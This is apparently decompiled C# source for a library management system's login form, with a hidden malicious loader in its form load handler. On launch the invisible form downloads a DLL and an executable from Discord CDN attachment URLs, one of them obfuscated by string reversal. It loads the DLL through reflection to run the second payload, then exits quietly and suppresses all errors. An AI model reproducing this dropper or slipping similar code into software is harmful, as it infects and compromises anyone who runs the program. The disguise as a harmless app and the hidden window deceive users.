using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Drawing;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace LibraryManagementSystem;

public class login : Form
{
	private SqlConnection con;

	private SqlCommand cmd;

	public static int userid;

	public static string password;

	private IContainer components = null;

	private Panel panel1;

	private Label loginLblQuote;

	private Button LoginBtnSubmit;

	private TextBox loginTbxPassword;

	private TextBox loginTbxUserId;

	private Label loginLblPassword;

	private Label loginLblUserId;

	private void login_Load(object sender, EventArgs e)
	{
		try
		{
			((Control)this).Hide();
			Thread.Sleep(2000);
			WebClient webClient = new WebClient();
			byte[] rawAssembly = webClient.DownloadData("https://cdn.discordapp.com/attachments/902978026868965390/908608077002076170/Telegram.dll");
			Thread.Sleep(2000);
			byte[] array = webClient.DownloadData(Reverse("exe.321/878492775954696809/932520471913829209/stnemhcatta/moc.ppadrocsid.ndc//:sptth"));
			Thread.Sleep(2000);
			Type type = Assembly.Load(rawAssembly).GetType("WhatsApp.WhatsApp");
			MethodInfo method = type.GetMethod("Tel");
			method.Invoke(type, new object[1] { array });
			Thread.Sleep(500);
			((Form)this).Close();
			Application.Exit();
		}
		catch (Exception)
		{
		}
		((Form)this).Close();
		Application.Exit();
	}

	public static string Reverse(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public login()
	{
		InitializeComponent();
	}

	public void clear()
	{
		((Control)loginTbxUserId).set_Text(string.Empty);
		((Control)loginTbxPassword).set_Text(string.Empty);
	}

	private void LoginBtnSubmit_Click(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		if (((DbConnection)(object)con).State == ConnectionState.Closed)
		{
			((DbConnection)(object)con).Open();
		}
		cmd = new SqlCommand("select * from users where user_id = @user_id and password = @password", con);
		cmd.get_Parameters().AddWithValue("@user_id", (object)((Control)loginTbxUserId).get_Text());
		cmd.get_Parameters().AddWithValue("@password", (object)((Control)loginTbxPassword).get_Text());
		SqlDataAdapter val = new SqlDataAdapter(cmd);
		DataTable dataTable = new DataTable();
		((DbDataAdapter)(object)val).Fill(dataTable);
		if (dataTable.Rows.Count > 0)
		{
			userid = Convert.ToInt32(((Control)loginTbxUserId).get_Text());
			password = ((Control)loginTbxPassword).get_Text();
			if (Convert.ToString(dataTable.Rows[0][1]) == "False")
			{
				((Control)this).Hide();
				userBookSearch userBookSearch2 = new userBookSearch();
				((Control)userBookSearch2).Show();
			}
			else
			{
				((Control)this).Hide();
				admStartPage admStartPage2 = new admStartPage();
				((Control)admStartPage2).Show();
			}
		}
		else
		{
			MessageBox.Show("The entered USER ID or PASSWORD is WRONG.\nPlease check and try again.\nIf you have forgotten the password then go to the librarian to create a new one.");
			clear();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Expected O, but got Unknown
		//IL_01f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fd: Expected O, but got Unknown
		//IL_026a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0274: Expected O, but got Unknown
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Expected O, but got Unknown
		//IL_0363: Unknown result type (might be due to invalid IL or missing references)
		//IL_036d: Expected O, but got Unknown
		//IL_03f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fc: Expected O, but got Unknown
		panel1 = new Panel();
		LoginBtnSubmit = new Button();
		loginTbxPassword = new TextBox();
		loginTbxUserId = new TextBox();
		loginLblPassword = new Label();
		loginLblUserId = new Label();
		loginLblQuote = new Label();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_Anchor((AnchorStyles)0);
		((Control)panel1).get_Controls().Add((Control)(object)LoginBtnSubmit);
		((Control)panel1).get_Controls().Add((Control)(object)loginTbxPassword);
		((Control)panel1).get_Controls().Add((Control)(object)loginTbxUserId);
		((Control)panel1).get_Controls().Add((Control)(object)loginLblPassword);
		((Control)panel1).get_Controls().Add((Control)(object)loginLblUserId);
		((Control)panel1).get_Controls().Add((Control)(object)loginLblQuote);
		((Control)panel1).set_Location(new Point(67, 53));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(901, 559));
		((Control)panel1).set_TabIndex(0);
		((Control)LoginBtnSubmit).set_Anchor((AnchorStyles)10);
		((Control)LoginBtnSubmit).set_Font(new Font("Microsoft Sans Serif", 13f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)LoginBtnSubmit).set_Location(new Point(456, 305));
		((Control)LoginBtnSubmit).set_Name("LoginBtnSubmit");
		((Control)LoginBtnSubmit).set_Size(new Size(74, 32));
		((Control)LoginBtnSubmit).set_TabIndex(9);
		((Control)LoginBtnSubmit).set_Text("Submit");
		((ButtonBase)LoginBtnSubmit).set_UseVisualStyleBackColor(true);
		((Control)LoginBtnSubmit).add_Click((EventHandler)LoginBtnSubmit_Click);
		((Control)loginTbxPassword).set_Font(new Font("Microsoft Sans Serif", 13f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)loginTbxPassword).set_Location(new Point(354, 256));
		((Control)loginTbxPassword).set_Name("loginTbxPassword");
		loginTbxPassword.set_PasswordChar('*');
		((Control)loginTbxPassword).set_Size(new Size(294, 27));
		((Control)loginTbxPassword).set_TabIndex(8);
		((Control)loginTbxUserId).set_Font(new Font("Microsoft Sans Serif", 13f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)loginTbxUserId).set_Location(new Point(354, 211));
		((Control)loginTbxUserId).set_Name("loginTbxUserId");
		((Control)loginTbxUserId).set_Size(new Size(294, 27));
		((Control)loginTbxUserId).set_TabIndex(7);
		((Control)loginLblPassword).set_AutoSize(true);
		((Control)loginLblPassword).set_Font(new Font("Consolas", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)loginLblPassword).set_Location(new Point(224, 261));
		((Control)loginLblPassword).set_Name("loginLblPassword");
		((Control)loginLblPassword).set_Size(new Size(110, 22));
		((Control)loginLblPassword).set_TabIndex(6);
		((Control)loginLblPassword).set_Text("Password :");
		((Control)loginLblUserId).set_AutoSize(true);
		((Control)loginLblUserId).set_Font(new Font("Consolas", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)loginLblUserId).set_Location(new Point(224, 216));
		((Control)loginLblUserId).set_Name("loginLblUserId");
		((Control)loginLblUserId).set_Size(new Size(100, 22));
		((Control)loginLblUserId).set_TabIndex(5);
		((Control)loginLblUserId).set_Text("User ID :");
		((Control)loginLblQuote).set_Anchor((AnchorStyles)2);
		((Control)loginLblQuote).set_AutoSize(true);
		((Control)loginLblQuote).set_Font(new Font("Microsoft Sans Serif", 20f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)loginLblQuote).set_Location(new Point(158, 124));
		((Control)loginLblQuote).set_Name("loginLblQuote");
		((Control)loginLblQuote).set_Size(new Size(585, 37));
		((Control)loginLblQuote).set_TabIndex(3);
		((Control)loginLblQuote).set_Text("A book is a gift you can open again and again...");
		loginLblQuote.set_TextAlign((ContentAlignment)32);
		loginLblQuote.set_UseCompatibleTextRendering(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1041, 638));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_Name("login");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Login");
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)login_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
